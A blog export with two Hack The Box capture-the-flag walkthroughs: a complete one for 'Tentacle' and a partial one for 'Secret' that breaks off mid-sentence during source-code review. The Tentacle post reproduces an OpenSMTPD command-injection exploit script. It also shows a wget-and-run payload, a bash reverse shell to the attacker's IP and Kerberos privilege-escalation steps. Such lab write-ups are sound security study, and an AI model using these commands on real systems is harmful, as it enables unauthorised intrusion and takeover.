"title": "HTB-Tentacle", "url": "/posts/TENTACLE/", "categories": "HACK THE BOX, Tentacle", "tags": "tentacle", "date": "2022-07-11 14:45:00 +0200", "snippet": "categories: [Hack the Box]tags: [Tentacle]—Index enumeraing Proxy Squid Exploiting OpenSMTPD 2.0.0 The powers of Kerberos combined with SSH Exploiting the log_backup script Grant permissions with kerberos .k5login file Kerberos KeytabenumeratingHe! Ho! Let’s go! Starting off with the Nmap TCP scan:┌──(kali㉿kali)-[~]└─$ sudo nmap -sV -sC -p- 10.129.44.237 -PnStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 14:06 EDTNmap scan report for 10.129.44.237Host is up (0.022s latency).Not shown: 65347 filtered tcp ports (no-response), 170 filtered tcp ports (admin-prohibited), 15 filtered tcp ports (host-unreach)PORT STATE SERVICE VERSION88/tcp open kerberos-sec MIT Kerberos (server time: 2022-07-11 18:10:06Z)3128/tcp open http-proxy Squid http proxy 4.11|_http-server-header: squid/4.11|_http-title: ERROR: The requested URL could not be retrieved9090/tcp closed zeus-adminService Info: Host: REALCORP.HTBService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 211.35 secondsFirst thing that stands out to me is port 3128 which is running http-proxy squid. As the name implies this isa web proxy. Port 88 seems to be open. On Windows this would most likely be a domain controller however, it is not a domain controller because it is a Linux machine. It could however be the service that manages Kerberos keys.First things first, let’s browse to http://10.129.44.237:3128/It seems the error message contains a hostname and an username.I tried ASREProasting and I did receive a hash, the hash however could not be cracked with Hashcat or John the Ripper, so this feels like a dead end.I have obtained however, a dns name: realcorp.htb. So we could try to search for subdomains:┌──(kali㉿kali)-[~]└─$ gobuster dns -d realcorp.htb -r 10.129.44.237 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 1 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Domain: realcorp.htb[+] Threads: 10[+] Resolver: 10.129.44.237[+] Timeout: 1s[+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt===============================================================2022/07/11 14:16:04 Starting gobuster in DNS enumeration mode===============================================================2022/07/11 14:16:06 [-] Unable to validate base domain: realcorp.htb (lookup realcorp.htb on 192.168.191.2:53: no such host)Found: ns.realcorp.htb Found: proxy.realcorp.htb Found: wpad.realcorp.htb We got the following dns names: ns.realcorp.htb proxy.realcorp.htb wpad.realcorp.htbLet’s try some reverse lookups using dig to see the IP addresses:┌──(kali㉿kali)-[~]└─$ dig @10.129.44.237 wpad.realcorp.htb; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; @10.129.44.237 wpad.realcorp.htb; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 21731;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096; COOKIE: 16fd19f84fc67f59162de0e762dd3387c6622e047dcad02d (good);; QUESTION SECTION:;wpad.realcorp.htb. IN A;; ANSWER SECTION:wpad.realcorp.htb. 259200 IN A 10.197.243.31;; AUTHORITY SECTION:realcorp.htb. 259200 IN NS ns.realcorp.htb.;; ADDITIONAL SECTION:ns.realcorp.htb. 259200 IN A 10.197.243.77;; Query time: 19 msec;; SERVER: 10.129.44.237#53(10.129.44.237) (UDP);; WHEN: Sun Jul 24 07:56:56 EDT 2022;; MSG SIZE rcvd: 123The IP addresses are internal addresses, so we cannot access these directly. However, here is where http-proxy squid comes into playProxy SquidFirst we need to configure proxychains.conf:http 10.129.44.237 3128 # Externalhttp 127.0.0.1 3128 # Interfacehttp 10.197.243.77 3128 # InternalThe first IP is our external proxy, so all traffic that runs through the proxy tunnel will go through the Squid proxy.The second IP routes through the internal interface of the proxy, so now we can reach proxy.realcorp.htb. which is 10.197.243.77And the third IP is for proxy.realcorp.htb is used to reach the internal network.Let’s see if we can reach wpad.realcorp.htb.We see a Forbidden page, which is actually not a bad thing because we can atleast reach the website.If we browse to wpad.dat we can see some information:──(kali㉿kali)-[~]└─$ proxychains curl http://wpad.realcorp.htb/wpad.dat [proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16[proxychains] Strict chain ... 10.129.44.237:3128 ... 127.0.0.1:3128 ... 10.197.243.77:3128 ... 10.197.243.31:80 ... OKfunction FindProxyForURL(url, host) { if (dnsDomainIs(host, \"realcorp.htb\")) return \"DIRECT\"; if (isInNet(dnsResolve(host), \"10.197.243.0\", \"255.255.255.0\")) return \"DIRECT\"; if (isInNet(dnsResolve(host), \"10.241.251.0\", \"255.255.255.0\")) return \"DIRECT\"; return \"PROXY proxy.realcorp.htb:3128\";}Wpad stands for windows proxy auto discover. Windows searches constatly for wpad.dat to autodetect proxies.If we look at the wpad.dat file we can see a new subnet that we haven’t seen before: 10.241.251.0-255.255.255.0Let’s look at the subdomain:┌──(kali㉿kali)-[~]└─$ dnsrecon -d realcorp.htb -n 10.129.44.237 -r 10.241.251.0/24 100 ⨯[*] Performing Reverse Lookup from 10.241.251.0 to 10.241.251.255[+] PTR srvpod01.realcorp.htb 10.241.251.113[+] 1 Records FoundWe got a new hostname and IP address srvpod01.realcorp.htb 10.241.251.113Now let’s do a fast Nmap scan. Running a normal Nmap scan will take a very long time becausewe are routing the traffic through a proxy.──(kali㉿kali)-[~]└─$ proxychains nmap -sT -F 10.241.251.113Nmap scan report for 10.241.251.113Host is up (0.100s latency).Not shown: 99 closed tcp ports (conn-refused)PORT STATE SERVICE25/tcp open smtpWe see that port 25 is open which is SMTP. Let’s do a more detailed scan to get more information onthis port.┌──(kali㉿kali)-[~]└─$ proxychains nmap -Pn -p 25 -sV -sC 10.241.251.113Nmap scan report for 10.241.251.113Host is up (0.099s latency).PORT STATE SERVICE VERSION25/tcp open smtp OpenSMTPD| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP infoService Info: Host: smtp.realcorp.htbService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 2.39 secondsThis shows us that they are using OpenSMTPD 2.0.0 and if I remember correctly, there is an exploit for this particular version.┌──(kali㉿kali)-[~]└─$ searchsploit OpenSMTPD ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit) | linux/remote/48038.rbOpenSMTPD - OOB Read Local Privilege Escalation (Metasploit) | linux/local/48185.rbOpenSMTPD 6.4.0 &lt; 6.6.1 - Local Privilege Escalation + Remote Code Execution | openbsd/remote/48051.plOpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.pyOpenSMTPD 6.6.3 - Arbitrary File Read | linux/remote/48139.cOpenSMTPD &lt; 6.6.3p1 - Local Privilege Escalation + Remote Code Execution | openbsd/remote/48140.c---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsRemote code execution linux/remote/47984.py looks interesting!──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]└─$ sudo searchsploit -m linux/remote/47984.py Exploit: OpenSMTPD 6.6.1 - Remote Code Execution URL: https://www.exploit-db.com/exploits/47984 Path: /usr/share/exploitdb/exploits/linux/remote/47984.pyFile Type: Python script, ASCII text executableCopied to: /home/kali/Documents/Other/HacktheBox/tentacel/47984.pyExploiting OpenSMTPD 2.0.0So what the script does is a command injection in the ‘MAIL FROM’ line.The script will ask for a Ip address, port and payloadit stores the third argument (which is the payload) into the CMD variable as seen below:if len(sys.argv) != 4: print('Usage {} &lt;target ip&gt; &lt;target port&gt; &lt;command&gt;'.format(sys.argv[0])) print(\"E.g. {} 127.0.0.1 25 'touch /tmp/x'\".format(sys.argv[0])) sys.exit(1)ADDR = sys.argv[1]PORT = int(sys.argv[2])CMD = sys.argv[3]First it checks the connection by sending an HELO x responseprint('[*] OpenSMTPD detected')s.send(b'HELO x\\r\\n')res = s.recv(1024)if '250' not in str(res): print('[!] Error connecting, expected 250') print('[!] Received: {}'.format(str(res))) print('[!] Exiting...') sys.exit(1)When the connection is succesful it will inject the payload which is stored in the CMD variableinto MAIL FROM:print('[*] Connected, sending payload')s.send(bytes('MAIL FROM:&lt;;{};&gt;\\r\\n'.format(CMD), 'utf-8'))res = s.recv(1024)if '250' not in str(res): print('[!] Error sending payload, expected 250') print('[!] Received: {}'.format(str(res))) print('[!] Exiting...') sys.exit(1)\tprint('[*] Payload sent')s.send(b'RCPT TO:&lt;root&gt;\\r\\n')s.recv(1024)s.send(b'DATA\\r\\n')s.recv(1024)s.send(b'\\r\\nxxx\\r\\n.\\r\\n')s.recv(1024)s.send(b'QUIT\\r\\n')s.recv(1024)print('[*] Done')Note that the script sends it to the root user however, we found an email addressof the user j.nakazawa.Let’s first connect to the mail server and see if this user exists:┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]└─$ sudo proxychains nc 10.241.251.113 25 130 ⨯[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16[proxychains] Strict chain ... 10.129.44.237:3128 ... 127.0.0.1:3128 ... 10.197.243.77:3128 ... 10.241.251.113:25 ... OK220 smtp.realcorp.htb ESMTP OpenSMTPDHELO x250 smtp.realcorp.htb Hello x [10.241.251.1], pleased to meet youMAIL FROM:&lt;;ping -c 1 10.10.15.147;&gt; 250 2.0.0 OkRCPT TO:&lt;j.nakazawa@realcorp.htb&gt;250 2.1.5 Destination address valid: Recipient okThe user seems to exist. I also checked for the root user but it fails to send an email.So let’s continue with nakazawa.To make the script work we need to change root:print('[*] Payload sent')s.send(b'RCPT TO:&lt;root&gt;\\r\\n')s.recv(1024)s.send(b'DATA\\r\\n')s.recv(1024)s.send(b'\\r\\nxxx\\r\\n.\\r\\n')s.recv(1024)s.send(b'QUIT\\r\\n')s.recv(1024)print('[*] Done')Into j.nakazawa@realcorp.htb:print('[*] Payload sent')s.send(b'RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;\\r\\n')s.recv(1024)s.send(b'DATA\\r\\n')s.recv(1024)s.send(b'\\r\\nxxx\\r\\n.\\r\\n')s.recv(1024)s.send(b'QUIT\\r\\n')s.recv(1024)print('[*] Done')Now let’s test the script by sending a ping request back to our local machine.Start a TCPdump listener:┌──(kali㉿kali)-[~]└─$ sudo tcpdump -i tun0 icmptcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytesNext, run the script with the ping command:┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]└─$ sudo proxychains python3 47984.py 10.241.251.113 25 'ping -c 4 10.10.15.147'Let’s check if TCPdump captured any ICMP traffic:┌──(kali㉿kali)-[~]└─$ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes10:28:14.689672 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 1, length 6410:28:14.689697 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 1, length 6410:28:15.692096 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 2, length 6410:28:15.692115 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 2, length 6410:28:16.693677 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 3, length 6410:28:16.693731 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 3, length 6410:28:17.695716 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 4, length 6410:28:17.695735 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 4, length 64Sweet! Because we received feedback from the mail server, we can try a reverse shell!I tried to send a reverse shell directly, however this did not seem to work. My guess is that any use of bad characters gets filtered out, rendering the payload useless. So instead I used a python webserver to get the shell on the target machine.Let’s create a simple shell-script chimpey.sh:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.43/443 0&gt;&amp;1Setup a python webserver:┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]└─$ sudo python3 -m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...Setup a listener:┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]└─$ nc -nlvp 443 And run the script.The next command will get the file with wget, place it into the /dev/shm folder of the target and runs the script with the bash command.──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]└─$ sudo proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.14.43/chimpey1.sh -O /dev/shm/chimpey1.sh; bash /dev/shm/chimpey1.sh'[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.16[proxychains] Strict chain ... 10.129.44.237:3128 ... 127.0.0.1:3128 ... 10.197.243.77:3128 ... 10.241.251.113:25 ... OK[*] OpenSMTPD detected[*] Connected, sending payload[*] Payload sent[*] DoneLadies and gents: We have our first foothold!┌──(kali㉿kali)-[~]└─$ nc -nlvp 443 listening on [any] 443 ...connect to [10.10.14.43] from (UNKNOWN) [10.129.69.39] 59396bash: cannot set terminal process group (150): Inappropriate ioctl for devicebash: no job control in this shellroot@smtp:~# ididuid=0(root) gid=0(root) groups=0(root)root@smtp:~# After some enumerating I found a password, stored in the .msmtprc file:root@smtp:/home/j.nakazawa# cat .msmtprccat .msmtprc# Set default values for all following accounts.defaultsauth ontls ontls_trust_file /etc/ssl/certs/ca-certificates.crtlogfile /dev/null# RealCorp Mailaccount realcorphost 127.0.0.1port 587from j.nakazawa@realcorp.htbuser j.nakazawapassword sJB}RM&gt;6Z~64_tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60I tried to login via ssh with the newfound credentials, but sadly no easy win.Kinda took me a while to figure this one out, but the alarm bells should have rung when thinking back onport 88. Kerberos on a Linux machine is not uncommon, but it is unusual.After some Google searching I stumpbled upon this website.I just played around with the idea and it worked! So let’s jump to the next chapter and get that damn flag!The powers of Kerberos combined with SSHSo my understanding is: you have two authorization systems Kerberos and SSH and each includesfeatures and services the other one lacks. The above mentioned website discusses how to combine the best of both worldsSo why is this method beneficial for us? Well, hear me out. The password did not work using ssh, however ssh kerberos is based on tickets.This opens up a whole new oppertunity because what we can do now is try to create our own ticket with the obtained credentials.First things first: we need to create a ticket on our local machine so install the following package:$ apt search krb5$ sudo apt install krb5-userThe next step is to configure the /etc/krb5.conf file.Change libdefaults to the following:[libdefaults]\tdefault_realm = REALCORP.HTBAdd srv01.realcorp.htb to realms:[realms]\tREALCORP.HTB = {\t\tkdc = srv01.realcorp.htb\t\tkdc = kerberos.mit.edu\t\tkdc = kerberos-1.mit.edu\t\tkdc = kerberos-2.mit.edu:88And finally add the following to domain realm (not sure if this part is needed).[domain_realm]\t.realcorp.htb = REALCORP.HTB\trealcorp.htb = REALCORP.HTBMake sure to add 10.241.251.113 srv01.realcorp.htb to your etc/hosts file.Next thing we need to do is request a ticket granted ticket (TGT).We can use the command kinit to renew our kerberos ticket:──(kali㉿kali)-[~]└─$ kinit j.nakazawa Password for j.nakazawa@REALCORP.HTB: Use the password we have obtained earlier on.You may notice nothing happened, but we can actually see if the ticket is granted using klist:┌──(kali㉿kali)-[~]└─$ klist 1 ⨯Ticket cache: FILE:/tmp/krb5cc_1000Default principal: j.nakazawa@REALCORP.HTBValid starting Expires Service principal07/30/2022 11:57:14 07/31/2022 11:57:14 krbtgt/REALCORP.HTB@REALCORP.HTBOh boy, oh boy, are you getting exited? I am! Let’s try to login with ssh:┌──(kali㉿kali)-[~]└─$ ssh j.nakazawa@10.129.105.158 Activate the web console with: systemctl enable --now cockpit.socketLast failed login: Sat Jul 30 17:14:41 BST 2022 from 10.10.14.53 on ssh:nottyThere were 20 failed login attempts since the last successful login.Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2[j.nakazawa@srv01 ~]$ iduid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[j.nakazawa@srv01 ~]$ Aaaah yeah, it’s our first flag![j.nakazawa@srv01 ~]$ lsuser.txt[j.nakazawa@srv01 ~]$ cat user.txt3c67ae9ad324[...]If your ssh connection seems to fail, make sure srv01.realcorp.htb is set as the first host inyour etc/hostS file. I don’t know why but it didn’t work for me when my first host was tentacle.htb.Exploiting the log_backup scriptAfter some enumerating one eternity later I found a log_backup.sh script, using cat /etc/crontab.[j.nakazawa@srv01 ~]$ cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed* * * * * admin /usr/local/bin/log_backup.shSo let’s have a looksey:[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh#!/bin/bash/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/cd /home/admin/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log/usr/bin/rm -f access.log cache.logThe script seems to be using rsync to copy all the files from /var/log/squid/ to /home/admin/ and then create an archive using tar.Let’s see if we have any permissions to /var/log/squid:[j.nakazawa@srv01 tmp]$ ls -ld /var/log/squid/drwx-wx---. 2 admin squid 41 Jul 30 17:30 /var/log/squid/We can see you need to be the admin user or you need to be part of the squid group. Use the following command to check if we are part of the squid group:[j.nakazawa@srv01 tmp]$ iduid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023Would you look at that… it seems we are!Grant permissions with kerberos .k5login fileSo what can we do now? Well, with ssh Kerberos it is actually possible to grant someone else access to your account via Kerberos.To grant other users access we need to create a .k5login file. In this file you can list different Kerberos principals, in our case j.nakazawa. This will basically give the principals added to that list permission to authenticate with theirtickets as the user that stored the .k5login file in his/her home directory.In this scenario the log_backup.sh script copies files to the /home/admin/ directory. What we can do iscreate a k5login file that contains the j.nakazawa user and add it to the admin’s home directory.Let’s write a simple .k5login file and store it in the /var/log/squid directory:[j.nakazawa@srv01 /]$ echo \"j.nakazawa@REALCORP.HTB\" &gt; /var/log/squid/.k5login[j.nakazawa@srv01 /]$ cd /var/log/squid/[j.nakazawa@srv01 squid]$ cat .k5loginj.nakazawa@REALCORP.HTBNow if the next cron triggers, it will add the file to the /home/admin directory, as we have seen in thelog_backup.sh script. Because the .k5login file is stored in the admin’s home directory, our j.nakazawa user can get accessas the admin user:┌──(kali㉿kali)-[~]└─$ ssh admin@realcorp.htbActivate the web console with: systemctl enable --now cockpit.socketLast login: Sat Jul 30 17:38:01 2022[admin@srv01 ~]$ iduid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[admin@srv01 ~]$ YAAAAAAAAAAAAAAAASH we are the admin user!BUUUUUUUUUUUUUT we are still not there yet!Kerberos KeytabAfter some enummerating, I noticed that I was able to read krb5.keytab. This fileis only readable by the admin or root user:[admin@srv01 etc]$ ls -la /etc/krb5.keytab-rw-r-----. 1 root admin 1403 Dec 19 2020 /etc/krb5.keytabI found some more information about keytab on this website.Keytab is a file that stores keys for principals.To see the list of principals we can use klist -k: �[admin@srv01 etc]$ [admin@srv01 etc]$ klist -kKeytab name: FILE:/etc/krb5.keytabKVNO Principal---- -------------------------------------------------------------------------- 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTBWe can see that our user is also kadmin that has admin and change password privileges. Thismeans that we can add principals to the keytab file.For more information about kadmin go to this websiteRun the following to run the kadmin console:[admin@srv01 etc]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTBCouldn't open log file /var/log/kadmind.log: Permission deniedAuthenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.Now lets add a new principal and give it an easy password:kadmin: add_principal rootNo policy specified for root@REALCORP.HTB; defaulting to no policyEnter password for principal \"root@REALCORP.HTB\": Re-enter password for principal \"root@REALCORP.HTB\": Principal \"root@REALCORP.HTB\" created.What we can do now is exit out of kadmin console and run ksu. What ksu does isrunning su using Kerberos:kadmin: exit[admin@srv01 etc]$ ksuWARNING: Your password may be exposed if you enter it here and are logged in remotely using an unsecure (non-encrypted) channel. Kerberos password for root@REALCORP.HTB: : Authenticated root@REALCORP.HTBAccount root: authorization for root@REALCORP.HTB successfulChanging uid to root (0)[root@srv01 etc]# And there it is! Now let’s get that last flag![root@srv01 etc]# cd /root[root@srv01 ~]# lsanaconda-ks.cfg root.txt[root@srv01 ~]# cat root.txtc97762a4b7e7fe22b[...]And there you have it! Not an easy box but nevertheless I have learned a lot! :)See you on the next hacking adventure!" }, { "title": "HTB-Secret", "url": "/posts/SECRET/", "categories": "HACK THE BOX, Secret", "tags": "secret", "date": "2022-07-10 19:42:00 +0200", "snippet": "categories: [Hack the Box]tags: [Secret]—Target machine: 10.129.198.24Attack machine:Secret from Hack the BoxIndex Enumerating Register user and Login Code Review Creating admin JWT token Remote code execution Privilege escalation CoredumpEnumeratingLet’s go, let’s go, let’s gooohoooo, let’s solve this secret! As per tradition let’s start off with a good old Nmap TCP scan:┌──(kali㉿kali)-[~/Documents/HacktheBox/secret]└─$ sudo nmap -p22,80,3000 -sV -sC -T4 -Pn -oA 10.129.198.24 10.129.198.24Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-17 06:58 ESTNmap scan report for secret.htb (10.129.198.24)Host is up (0.026s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)|_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: DUMB Docs|_http-server-header: nginx/1.18.0 (Ubuntu)3000/tcp open http Node.js (Express middleware)|_http-title: DUMB DocsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.49 secondsWe see SSH open on port 22, a website on port 80 and… well this is interesting, port 3000 which is also a website.While browsing through the website I noticed it might be possible to register a user.Page of the website that shows how to register usersThe website goes into detail on how to register and how to login, so let’s follow the steps described on the following page: http:\\\\&lt;TARGET-IP&gt;:3000/docs#section-3Register user and LoginI used an intercepting proxy (e.g Burp Suite) to intercept the request from the front page of thewebsite and send it to the repeater in Burp Suite.Get request front pageNext, I changed the request method to POST by right-clicking and choosing “Change request method”.POST / HTTP/1.1Host: 10.129.44.169:3000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-None-Match: W/\"3248-nFUp1XavqYRgAFgHenjOsSPQ/e4\"Content-Type: application/x-www-form-urlencodedContent-Length: 0Last but not least, I changed the filepath location and the POST body to look like the example shown on page /docs#section-3 of the website.My final request looked like the following:POST /api/user/register HTTP/1.1Host: 10.129.198.24:3000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: application/jsonAccept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-None-Match: W/\"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s\"Content-Type: application/jsonContent-Length: 90{\t\"name\": \"Ch1mp3y\",\t\"email\": \"test@test.nl\",\t\"password\": \"Ch1mp3y123!\"}When forwarding the request in Burp Suite we can see that the user is registeredThe user is registeredAlright now that we are registered, it should be possible to login.POST /api/user/login HTTP/1.1Host: 10.129.198.24:3000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: application/jsonAccept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-None-Match: W/\"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s\"Content-Type: application/jsonContent-Length: 69{\t\"email\": \"test@test.nl\",\t\"password\": \"Ch1mp3y123!\"}We received an authentication token, which means the login attempt was successful.HTTP/1.1 200 OKX-Powered-By: Expressauth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmNiZGIyMDVlMzY1NTA0NzkwMzlkMmIiLCJuYW1lIjoiQ2gxbXAzeSIsImVtYWlsIjoidGVzdEB0ZXN0Lm5sIiwiaWF0IjoxNjU3NTI4Nzk5fQ.Zf29Eo64ZVtZxyzuLP-bsraUX25ytTNU_lNJX6kTvR0Content-Type: text/html; charset=utf-8Content-Length: 203ETag: W/\"cb-f3OYk+ehyWOtQh4osqBwpHundr8\"Date: Mon, 11 Jul 2022 08:39:59 GMTConnection: closeeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmNiZGIyMDVlMzY1NTA0NzkwMzlkMmIiLCJuYW1lIjoiQ2gxbXAzeSIsImVtYWlsIjoidGVzdEB0ZXN0Lm5sIiwiaWF0IjoxNjU3NTI4Nzk5fQ.Zf29Eo64ZVtZxyzuLP-bsraUX25ytTNU_lNJX6kTvR0Authenticated userWell.. now what?! I am ashamed to admit this, but it took me way too long to notice the VERY big buttonon the front page saying source code.Source codeLet’s do a litte code reviewCode ReviewThe index.js page shows us that there is a file called auth.// import routes const authRoute = require('./routes/auth');const webroute = require('./src/routes/web')In auth.js we see the register endpoint and a login section which will check an account and then creates a JSON Web token.We saw this in action already in the above steps.Register user:┌──(kali㉿kali)-[~/…/HacktheBox/Secret/local-web/routes]└─$ cat auth.js const router = require('express').Router();const User = require('../model/user');const bcrypt = require('bcryptjs')const jwt = require('jsonwebtoken')const { registerValidation, loginValidation} = require('../validations')router.post('/register', async (req, res) =&gt; { // validation const { error } = registerValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if user exists const emailExist = await User.findOne({email:req.body.email}) if (emailExist) return res.status(400).send('Email already Exist') // check if user name exist const unameexist = await User.findOne({ name: req.body.name }) if (unameexist) return res.status(400).send('Name already Exist') //hash the password const salt = await bcrypt.genSalt(10); const hashPaswrod = await bcrypt.hash(req.body.password, salt) //create a user const user = new User({ name: req.body.name, email: req.body.email, password:hashPaswrod }); try{ const saveduser = await user.save(); res.send({ user: user.name}) } catch(err){ console.log(err) }});Login the user:// login router.post('/login', async (req , res) =&gt; { const { error } = loginValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if email is okay const user = await User.findOne({ email: req.body.email }) if (!user) return res.status(400).send('Email is wrong'); // check password const validPass = await bcrypt.compare(req.body.password, user.password) if (!validPass) return res.status(400).send('Password is wrong'); // create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header('auth-token', token).send(token);})router.use(function (req, res, next) { res.json({ message: { message: \"404 page not found\", desc: \"page you are looking for is not found. \" } })});module.exports = router Moving on, I stumbled upon the private.js in the routes folder.┌──(kali㉿kali)-[~/…/HacktheBox/Secret/local-web/routes]└─$ cat private.jsconst router = require('express').Router();const verifytoken = require('./verifytoken')const User = require('../model/user');router.get('/priv', verifytoken, (req, res) =&gt; { // res.send(req.user) const userinfo = { name: req.user } const name = userinfo.name.name; if (name == 'theadmin'){ res.json({ creds:{ role:\"admin\", username:\"theadmin\", desc : \"welcome back admin,\" } }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) }})The script shows us another endpoint called /priv, and even more interessting if the username equals theadmin and if we have the correct token, we can authenticate as the admin user.So let’s see what else we got in the source code foldersI noticed a .git 